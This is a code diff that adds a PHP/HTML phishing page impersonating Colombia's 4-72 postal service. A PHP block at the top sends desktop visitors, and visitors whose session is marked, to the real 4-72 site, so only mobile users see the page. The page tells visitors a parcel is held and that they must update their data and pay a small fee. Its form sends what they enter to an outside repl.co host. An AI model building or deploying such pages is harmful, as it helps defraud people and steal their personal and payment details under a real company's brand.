@@ -1,0 +1,141 @@
+<?php
+ 
+$user_agent = $_SERVER["HTTP_USER_AGENT"];
+session_start();
+$user = $_SESSION['user'];
+if($user == "hola"){
+   header('location:https://www.4-72.com.co');
+}
+else if(preg_match("/(android|webos|avantgo|iphone|ipod|ipad|bolt|boost
+|cricket|docomo|fone|hiptop|opera mini|mini|kitkat|mobi|palm|phone|pie
+|tablet|up\.browser|up\.link|webos|wos)/i",$user_agent ))
+{
+}
+else{
+      header('location:https://www.4-72.com.co');
+}
+ 
+?>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+	rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" 
+	crossorigin="anonymous">
+    <title>Document</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" 
+	integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" 
+	crossorigin="anonymous"></script>
+</head>
+<body style="background-color: rgb(245, 245, 245);">
+
+
+    <div class="menu">
+        <img src="/img/menu.jpg" alt="" width="100%">
+    </div>
+
+    <div id="carouselExampleDark" class="carousel carousel-dark slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+          <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+          <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="1" aria-label="Slide 2"></button>
+          <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="2" aria-label="Slide 3"></button>
+        </div>
+        <div class="carousel-inner">
+          <div class="carousel-item active" data-bs-interval="2000">
+            <img src="/img/1.webp" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-none d-md-block">
+              <h5>First slide label</h5>
+              <p>Some representative placeholder content for the first slide.</p>
+            </div>
+          </div>
+          <div class="carousel-item" data-bs-interval="2000">
+            <img src="/img/2.webp" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-none d-md-block">
+              <h5>Second slide label</h5>
+              <p>Some representative placeholder content for the second slide.</p>
+            </div>
+          </div>
+          <div class="carousel-item">
+            <img src="/img/3.webp" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-none d-md-block">
+              <h5>Third slide label</h5>
+              <p>Some representative placeholder content for the third slide.</p>
+            </div>
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleDark" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleDark" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+    
+
+      <center><div class="codigo" style=" background-color: #ffc72c; width: 93%; border-radius: 15px; margin-top: 35px;">
+        <br>
+      <img src="/img/codigo.jpg" alt="" srcset="" width="100%">
+
+        <b><input type="text" name="codigo" id="" placeholder="No. Guía 8569741" style="width: 85%; height: 100px;  border-radius:15px; font-family: Arial, Helvetica, sans-serif;  font-weight: bold; border: none;" readonly></b>
+      
+      <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal" style="background-color: 
+        #f75d7e; color: white; border: none; position:relative; bottom: 30px; border-radius:65px; border-top-right-radius: 150px; border-bottom-right-radius:150px ; width: 150px; height: 50px;">
+  Consultar
+</button>
+
+    <label for="terminos" style="position: relative; bottom:25px;">
+        <input type="checkbox" name="" id="terminos" >
+        Acepto terminos y condiciones
+    </label>
+    
+      </div></center>
+
+      <div class="img" style="margin-top:40px;">
+        <img src="/img/a1.jpg" alt="" width="100%">
+        <img src="/img/a2.jpg" alt="" width="100%">
+        <img src="/img/f1.jpg" alt="" width="100%">
+        <img src="/img/f2.jpg" alt="" width="100%">
+        <img src="/img/f3.jpg" alt="" width="100%">
+        <img src="/img/f4.jpg" alt="" width="100%">
+        <img src="/img/f5.jpg" alt="" width="100%">
+
+
+      </div>
+
+
+
+
+
+      <!-- Modal -->
+<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:20px;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="exampleModalLabel">Paquete retenido.</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <form action="https://plataforma472envios.enviosnacionale.repl.co/rastrear.php" method="post">
+        El paquete con guía de rastreo N°: 8569741. Se encuentra retenido. debe actualizar los datos de envio y realizar el pago de impuestos al iva por un valor de: $8.689 COP.
+
+
+
+<p></p>
+        
+    
+      <div class="modal-footer">
+      <button class="btn btn-warning" style="color:white;">Actualizar datos.</button>
+      </form>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
